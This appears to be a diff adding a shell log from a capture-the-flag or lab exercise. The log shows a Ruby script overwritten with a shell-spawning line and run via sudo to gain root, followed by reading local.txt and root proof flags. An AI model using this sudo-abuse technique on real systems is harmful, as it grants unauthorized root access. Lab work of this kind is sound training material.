@@ -1,0 +1,54 @@
+cp app.rb app.rb.bak
+echo 'exec "/bin/sh"' > app.rb
+/usr/bin/ruby app.rb
+ls
+app.rb
+app.rb.bak
+page.pdf
+whoami
+andrew
+ls
+app.rb
+app.rb.bak
+page.pdf
+ls
+app.rb
+app.rb.bak
+page.pdf
+which ruby
+/usr/bin/ruby
+sudo ruby app.rb
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+ls
+app.rb
+app.rb.bak
+page.pdf
+sudo /usr/bin/ruby /home/andrew/app/app.rb
+whoami
+root
+ls
+app.rb
+app.rb.bak
+page.pdf
+cd ..
+ls
+app
+local.txt
+snap
+cat local.txt
+00346fc5701ba71a906456fb5a85e6a4
+ls
+app
+local.txt
+snap
+pwd
+/home/andrew
+cd ../../root
+ls
+email1.txt
+proof.txt
+snap
+cat proof.txt
+442edc353fb7f33d18885488ed53a36e
+
